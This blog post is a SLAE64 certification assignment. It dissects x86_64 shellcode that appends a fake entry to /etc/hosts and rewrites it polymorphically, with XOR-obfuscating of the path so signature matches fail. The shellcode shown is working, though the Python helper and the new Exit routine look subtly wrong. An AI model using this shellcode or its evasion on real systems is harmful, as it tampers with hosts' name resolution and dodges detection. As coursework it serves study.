Title: SLAE64 - Assignment 6.2
Date: 2022-07-07T06:40:27.000Z

<h2 id="disclaimer">Disclaimer</h2><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:</p><p><a href="https://www.pentesteracademy.com/course?id=7">https://www.pentesteracademy.com/course?id=7</a></p><p>Student ID: PA-30398</p><h2 id="foreword">Foreword</h2><p>I chose the following shellcode samples:</p><ol><li><a href="https://shell-storm.org/shellcode/files/shellcode-878.php">Read /etc/passwd - 82 bytes</a></li><li><a href="https://shell-storm.org/shellcode/files/shellcode-896.php">Add map in /etc/hosts file - 110 bytes</a></li><li><a href="https://shell-storm.org/shellcode/files/shellcode-867.php">Reads data from /etc/passwd to /tmp/outfile - 118 bytes</a></li></ol><p>In this part I'll create a polymorphic version of the second shellcode.</p><h2 id="source-code">Source Code</h2><p>The files for this part of the assignment are the following:</p><ul><li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae64/assignment/6/2/original.nasm">original.nasm</a>, the original shellcode</li><li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae64/assignment/6/2/polymorphic.nasm">polymorphic.nasm</a>, which is the polymorphic version I've written</li></ul><h2 id="analysis">Analysis</h2><p>The second shellcode simply adds a new entry to the file <code>/etc/hosts</code>. In this case, it adds the following mapping:<code>127.1.1.1 google.lk</code>.</p><p>Below is an analysis of the interested shellcode with some comments describing its logic.</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">; Title: Add map in /etc/hosts file - 110 bytes
; Date: 2014-10-29
; Platform: linux/x86_64
; Website: http://osandamalith.wordpress.com
; Author: Osanda Malith Jayathissa (@OsandaMalith)

global _start

section .text

_start:

    ; set RAX to 2 (syscall open)
    xor rax, rax 
    add rax, 2

    ; clear RDI and RSI
    xor rdi, rdi
    xor rsi, rsi
    
    ; 1st argument of open: pointer to the file to open
    ; in this case: /etc///////hosts
    push rsi ; 0x00 
    mov r8, 0x2f2f2f2f6374652f ; stsoh/
    mov r10, 0x7374736f682f2f2f ; /cte/
    push r10
    push r8
    add rdi, rsp

    ; 2nd argument of open: flags to use when opening
    ; the file
    ; in this case: 0x401 (O_WRONLY | O_APPEND)
    xor rsi, rsi
    add si, 0x401

    ; invoke open syscall
    syscall

    ; save the file descriptor of the opened file in
    ; the register RDI
    xchg rax, rdi


    ; set RAX to 1: syscall write
    xor rax, rax

    ; invoke the syscall write
    add rax, 1

    ; use the JMP-POP-CALL syscall to get the address
    ; of the new host entry into RSI
    jmp data

write:

    pop rsi

    ; 3rd argument of write syscall, number of bytes
    ; to write 
    mov dl, 19

    ; invoke syscall write
    syscall

    ; invoke syscall close
    xor rax, rax
    add rax, 3
    syscall

    ; invoke syscall exit
    xor rax, rax
    mov al, 60
    xor rdi, rdi
    syscall 

data:

    call write
    text db '127.1.1.1 google.lk'</code></pre><figcaption>Analysis of the original shellcode</figcaption></figure><p>To recapitulate, the shellcode performs the following operations:</p><ul><li>using the syscall <code>open</code> to open the file <code>/etc/hosts</code> in write-append mode</li><li>using the syscall <code>write</code> to write a new entry in the previous file</li><li>using the syscall <code>close</code></li><li>using the syscall <code>exit</code> to terminate the execution of the program</li></ul><p>During the analysis of the shellcode, I discovered that you can use some python instruction to get the values of the flags used by the syscall <code>open</code>.</p><p>It's quite convenient since they may differ from online references based on the architecture of your computer.</p><figure class="kg-card kg-code-card"><pre><code class="language-py">import os

open_flags = [x for x in exports if x.startswith("O_")]

[print(f"[+] {key:&lt;15} -&gt; {hex(getattr(os,key))}") for key in open_flags]
# [+] O_ACCMODE       -&gt; 0x3
# [+] O_APPEND        -&gt; 0x400
# [+] O_ASYNC         -&gt; 0x2000
# [+] O_CLOEXEC       -&gt; 0x80000
# [+] O_CREAT         -&gt; 0x40
# [+] O_DIRECT        -&gt; 0x4000
# [+] O_DIRECTORY     -&gt; 0x10000
# [+] O_DSYNC         -&gt; 0x1000
# [+] O_EXCL          -&gt; 0x80
# [+] O_LARGEFILE     -&gt; 0x0
# [+] O_NDELAY        -&gt; 0x800
# [+] O_NOATIME       -&gt; 0x40000
# [+] O_NOCTTY        -&gt; 0x100
# [+] O_NOFOLLOW      -&gt; 0x20000
# [+] O_NONBLOCK      -&gt; 0x800
# [+] O_PATH          -&gt; 0x200000
# [+] O_RDONLY        -&gt; 0x0
# [+] O_RDWR          -&gt; 0x2
# [+] O_RSYNC         -&gt; 0x101000
# [+] O_SYNC          -&gt; 0x101000
# [+] O_TMPFILE       -&gt; 0x410000
# [+] O_TRUNC         -&gt; 0x200
# [+] O_WRONLY        -&gt; 0x1</code></pre><figcaption>Python script to list open flags</figcaption></figure><h2 id="polymorphism">Polymorphism</h2><p>The shellcode is made up of the following routines:</p><ul><li><em>OpenFile</em>, for opening the file <code>/etc/hosts</code></li><li><em>WriteFile</em>, for writing the host entry to the file</li><li><em>RetrieveEntryPointer</em>, which allows me to retrieve the address of the host entry through the <code>JMP-CALL-POP</code> technique</li><li><em>CloseFile</em>, which closes the file descriptor of <code>/etc/hosts</code></li><li><em>Exit</em>, which gracefully terminates the execution of the shellcode</li></ul><h3 id="opening-the-file">Opening the file</h3><p>Follows the assembly code for the first routine:</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">global _start

section .text

_start:

OpenFile:
   
    ; clear RAX for later usage
    xor eax, eax

    ; 2nd argument of open: flags to use when opening
    ; the file
    ; in this case: 0x401 (O_WRONLY | O_APPEND)
    push rax
    push rax
    pop rsi
    mov si, 0x401

    ; set RAX to 2 (syscall open)
    add rax, 2
    
    ; string "ts" of "/etc/hosts"
    push WORD 0x7374

    ; string "/etc/hos" encrypted through XOR
    mov rbx, 0x3b944e4c5e433bbe
    mov rcx, 0x48fb26633d375e91
    xor rbx, rcx
    push rbx

    ; 1st argument of open: pointer to the file to open
    ; file "/etc/hosts" in this case
    mov rdi, rsp

    ; invoke open syscall
    syscall</code></pre><figcaption>Opening <code>/etc/hosts</code></figcaption></figure><p>Compared to the original shellcode, the order of the instructions is slightly different, and some of the registers used are different.</p><p>Doing so, the resulting bytes after assembling the program are going to be different.</p><p>In addition, instead of keeping the string <code>/etc/hosts</code> in clear-text, I chose to obfuscate it by <code>XOR</code>-ing it with a random key.</p><h3 id="writing-the-host-entry">Writing the host entry</h3><p>The snippet below contains the next two routines, which appends the <code>google.lk</code> entry to the file <code>/etc/hosts</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">WriteFile:

    ; save the file descriptor of the opened file in
    ; the register RDI
    push rax
    pop rdi

    ; set RAX to 1 (syscall write)
    xor eax, eax

    ; clear RDX (for later use) by means of
    ; sign-extension of RAX
    cdq

    ; 3rd argument of write syscall, number of bytes
    ; to write 
    add dl, 19

    ; invoke the syscall write
    inc eax

    ; use the JMP-POP-CALL syscall to get the address
    ; of the new host entry into RSI
    jmp Data

RetrieveEntryPointer:

    ; get the address of the host entry
    mov rsi, QWORD [rsp]

    ; invoke syscall write
    syscall
    
; Some routines are omitted for clarity
    
Data:

    call RetrieveEntryPointer
    text db '127.1.1.1 google.lk'</code></pre><figcaption>Append the host entry to <code>/etc/hosts</code></figcaption></figure><p>Instead of using the instruction <code>XCHG</code> I chose the simple <code>PUSH</code> and <code>POP</code> method to save the file descriptor in the <code>RDI</code> register .</p><p>After that, I used <code>CDQ</code> (Convert Double to Quad) to clear the <code>RDX</code> register. Rather than using the <code>ADD</code> instruction (to increase <code>RAX</code>) I simply used <code>INC</code>.</p><p>Finally, I changed a bit the <code>JMP-POP-CALL</code> technique. Instead of the <code>CALL</code> instruction I used <code>MOV</code>. After all, if there are no other values on the stack, then you don't really have to use <code>POP</code>.</p><h3 id="cleaning-up">Cleaning up</h3><p>The last two routines close the file descriptor of the file <code>/etc/hosts</code>, opened previously with <code>sys_open</code> and terminate the execution of the shellcode with <code>sys_exit</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">CloseFile:

    ; invoke syscall close
    xor eax, eax
    mov al, 3
    syscall

Exit:

    ; invoke syscall exit
    xor eax, eax
    add al, 195
    not eax
    syscall </code></pre><figcaption>Cleaning routines</figcaption></figure><p>If you care about the size of your shellcode, then you could also remove them to save about 14 bytes.</p><p>In the end, the polymorphic code occpies 102 bytes, which is 8 bytes less than the original code.</p>